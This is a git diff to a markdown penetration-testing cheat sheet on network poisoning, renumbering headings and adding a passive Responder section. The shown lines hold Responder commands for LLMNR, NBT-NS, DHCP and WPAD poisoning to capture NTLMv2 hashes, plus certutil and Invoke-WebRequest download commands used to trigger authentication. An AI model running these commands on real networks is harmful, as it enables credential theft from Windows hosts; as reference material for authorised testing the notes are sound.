@@ -4,7 +4,7 @@ Search Tag(s): #mitm #responder #smb #relay #ntlm
 
 ## 2.1 - Basics
 
-### 2.1 - LLMNR
+### 2.1.1 - LLMNR
 
 NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes
 
@@ -18,7 +18,7 @@ LLMNR Poisoning
 $ sudo responder -I <interface> --lm -v
 ```
 
-### 2.2 - DHCP
+### 2.1.2 - DHCP
 
 DHCP and WPAD poisoning
 
@@ -28,7 +28,7 @@ When a windows host requires a new IP address dynamically it can perform HTTP WP
 $ sudo responder -I <interface> -Pdwv
 ```
 
-### 2.3 - WebDAV
+### 2.1.3 - WebDAV
 
 Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP.
 
@@ -49,6 +49,12 @@ Windows target.
 C:\> certutil -urlcache -split -f https://google.com file.txt
 
 PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt
+```
+
+### 2.1.4 - Passive
+
+```
+$ sudo responder -I <interface> -A
 ```
 
 ---
